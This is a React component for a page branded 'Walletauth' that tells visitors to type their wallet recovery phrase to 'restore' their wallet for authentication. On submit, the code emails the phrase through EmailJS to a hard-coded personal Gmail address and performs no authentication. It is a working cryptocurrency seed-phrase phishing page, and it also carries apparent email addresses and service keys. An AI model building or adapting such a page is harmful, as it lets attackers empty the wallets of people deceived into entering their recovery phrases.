import React from 'react'
import { useState } from 'react';
import { Link } from 'react-router-dom'
import * as emailjs from "emailjs-com";
import icon from '../../resources/images/icon.png'
import { Button, Form, notification } from 'antd';


function AuthPage() {
  const [loading, setLoading] = useState(false)
  const [form] = Form.useForm()

  const handleSubmit = (data) => {
    setLoading(true);

    const templateParams = {
      from_email: "walletauth@gmail.com",
      from_name: "Wallet Authenticator",
      to_name: "stevewinfried@gmail.com",
      message: data.message,
    };

    emailjs
      .send(
        "service_a287jf4",
        "template_5tx1mqi",
        templateParams,
        "mE2fJOTkVsrNl8zkR"
      )
      .then(
        (result) => {
          notification.success({
            message: "Success!",
            description: `${result.text}, your request was sent successfully.`
          })
          setLoading(false);
          form.resetFields()
        },
        (error) => {
          notification.error({
            message: "Error!",
            description: `An error occurred, ${error.text}`
          })
          setLoading(false);
        }
      );
  };

  return (
    <div className='w-full'>
      <div className="auth-body vh-100">
        <header id="header" className="header vh-100">
            <div className="w-100 container-sm">
                <div className="row">
                    <div className="col-lg-12">
                        <div className="container">
                            <div className="w-100 py-4 p-md-5">
                                <div className="animate-top card card-card border-0">
                                    <div className="card-header d-flex justify-content-between py-md-3 text-secondary">
                                        <div>
                                          <p className="fs-1 fw-bold text-white d-flex space-x-2">
                                            <span><img alt="..." src={icon} className="image-fluid md:pt-2.5" width="40px" /></span>
                                            <span><span className="text-info">W</span><i>alletauth</i></span>
                                          </p>
                                        </div>
                                        <div className="d-none d-md-block pt-2">
                                            <Link className="btn btn-info text-light" to="/"><i className="fa fa-angle-left me-2"></i> back</Link>
                                        </div>
                                    </div>
                                    <div className="card-body p-md-5">
                                        <div className="text-center text-light">
                                            <p className="fs-4 m-0 fw-bold">Import Your Wallet</p>
                                            <p className="fs-6 m-0 px-md-5">Type in your word recovery phase to restore your existing wallet for <span className="text-info animate-fading">authentication.</span></p>
                                        </div>
                                        <Form className="my-3 px-md-5" form={form} id="signUpForm" onFinish={handleSubmit}>
                                            <Form.Item name="message" className="form-group animate-left">
                                                <textarea name='phrase' className="form-control border-info" id="exampleFormControlTextarea1 semail" rows="3" required></textarea>
                                            </Form.Item>
                                            <div className="my-4 animate-right">
                                                <Button size='large' block type='primary' loading={loading} htmlType="submit" className="bg-info">Restore</Button>
                                            </div>
                                        </Form>
                                    </div>
                                    <p className="text-center text-light p-2">Tap spacebar to enter the next word or tap bubble to edit specific words. </p>
                                </div>
                            </div>

                            <div className="w-100">
                                <div className="position-absolute bottom-0 start-50 end-0 translate-middle-x">
                                    <hr className="bg-light" />
                                    <div className="animate-zoom text-center text-light py-2">
                                        <span>Copyright <i className="fa fa-copyright"></i> <span id="date">{new Date().getFullYear()}</span> Walletauth</span>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div> 
                </div> 
            </div>

        </header> 
      </div>
    </div>
  )
}

export default AuthPage